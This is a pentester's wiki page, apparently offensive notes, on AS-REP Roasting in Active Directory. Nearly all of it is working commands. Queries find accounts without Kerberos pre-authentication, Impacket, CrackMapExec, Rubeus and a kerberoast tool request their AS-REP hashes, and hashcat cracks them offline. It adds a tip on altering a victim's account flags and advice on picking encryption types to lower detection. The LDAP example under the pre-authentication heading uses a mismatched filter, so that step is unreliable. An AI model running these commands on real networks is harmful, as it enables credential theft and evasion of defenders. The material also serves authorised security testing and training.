alias:: ASREPRoast
public:: true

- In case the [Kerberos Pre-Authentication](((655b158a-a666-41e0-8076-e59942a7bb20))) is not enabled for one or more domain users, an [AS-REQ](((655b1c01-e1e1-4be0-b245-ff8c9482df38))) can be forged without knowing their password (or the hash) and sent to KDC on their behalf.
- Once the [AS-REP](((655b1795-7a37-4e7f-b428-6c9a34ab2cbf))) is returned from the domain controller, [the encrypted part of the response](1. ) can be brute-forced offline to retrieve the user password.
- #+BEGIN_NOTE
  Please note that in order to execute most of the following commands you need be able to query the DC. Hence, you need access to a valid domain user.
  #+END_NOTE
	- Retrieve the list of users with [Kerberos Pre-Authentication disabled](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/).
		- From Windows
			- With PowerView
			  id:: 655cf631-e9b4-4a1f-99d0-45c801c69f8c
			  ```powershell
			  Get-DomainUser -PreauthNotRequired
			  ```
			  ```powershell
			  # Users with Pre-Authentication disabled AND without expired passwords
			  Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED
			  ```
			- With LDAP
			  ```powershell
			  ldapsearch -LLL -x -H ldap://dc01.hpbank.local -D "da@hpbank.local" -w 'P@ssw0rd' -b dc=hpbank,dc=local "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName userPrincipalName memberOf
			  ```
			- With pure Powershell
			  ```powershell
			  $root = [ADSI]"LDAP://dc=hpbank,dc=local"
			  $search = new-Object System.DirectoryServices.DirectorySearcher($root)
			  $search.Filter ="(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
			  $search.FindAll()
			  ```
			- With Active Directory module
			  ```powershell
			  Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
			  ```
	- From Linux via [[Impacket GetNPUsers]]
		- id:: 5971e61f-2ed6-4dd2-91a6-1752dfb51de7
		  ```bash
		  impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
		  ```
- id:: 655cf4a9-95ae-4eb8-be69-cd1fb9b251c6
  #+BEGIN_TIP
  If you have **GenericWrite** or **GenericAll** rights over a target user, you can maliciously [modify their userAccountControl](https://learn.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) to [not require preauth](((655b158a-a666-41e0-8076-e59942a7bb20))), use [[AS-REP Roasting]] , and then reset the value.
  #+END_TIP
- Retrieve ASREPRoast hashes
	- From Linux
		- With [[Impacket GetNPUsers]]
			- id:: 655cf20b-a6e7-4003-8049-8d922905d0b1
			  ```bash
			  impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
			  ```
				- `-request` - is specified to request the [TGT](((655a4269-21dc-4947-a21d-5c89e404b561))).
				- `corp.com/pete` - is the domain user from where we can query the DC. We'll need to input his password.
				- `-outputfile hashes.asreproast` - file to save captured hashes.
					- Default output is for [[Hashcat]]. The generate [[JTR]] compatible hash use `--format john`
			- With [[CrackMapExec]]
			  id:: 65673473-d9f8-42e7-a1ba-c234679b312d
				- ```bash
				  crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast hashes.asreproast --KdcHost $KeyDistributionCenter
				  ```
			- With [Kerberoast]([[Kerberoast tool]])
			  id:: 6567356f-171b-4626-a6ed-f9551a966b85
				- This tool asks for aes 128/256 encrypted tickets. Making the crack process way harder, but also decreasing the detection risk.
				- ```bash
				  python3 -m kerberoast asreproast -r hpbank.local -u da 192.168.0.122 -e 18
				  ```
				- To crack it with [[JTR]] it's necessary to change the format for the output to `$krb5asrep$18$<SALT>$<FIRST_BYTES>$<LAST_12_BYTES>`
	- From Windows
		- With [[Rubeus]]
			- id:: 655cf178-e37d-4ab0-9e2b-e16c2ff7c94f
			  ```powershell
			  .\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.asreproast [/user:username]
			  ```
				- By default only users that have the property [*Do not require Kerberos preauthentication*](((655b158a-a666-41e0-8076-e59942a7bb20))) set are processed. For the full `asreproast` command usage [check here](https://github.com/GhostPack/Rubeus#asreproast).
				- `/format:hashcat` - Generate [[Hashcat]] compatible hash, the default output is for [[JTR]].
				- `/outfile:` - file to save captured hashes.
	- #+BEGIN_CAUTION
	  All tools, but [[Kerberoast tool]] ask for RC4 encrypted tickets that can be (and probably will be) detected by SOC ([Sigma Rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_susp_rc4_kerberos.yml)).
	  #+END_CAUTION
- Crack **Kerberos 5 AS-REP** hashes via [[Hashcat]] with the [`-m 18200`](https://hashcat.net/wiki/doku.php?id=example_hashes) option.
  id:: 655cd6cd-968a-4756-b77f-35c47110ad33
  ```bash
  sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt \
  	-r /usr/share/hashcat/rules/best64.rule --force
  ```
	- `-m 18200` - specifies the correct mode
	- `hashes.asreproast` - is the file with the hashes, as it was output by `impacket-GetNPUsers` or `Rubeus`
	- `rockyou.txt` - the wordlist we want to use
	- `best64.rule` - the rules to apply to the wordlist
	- `--force` - to run `hashcat` in Kali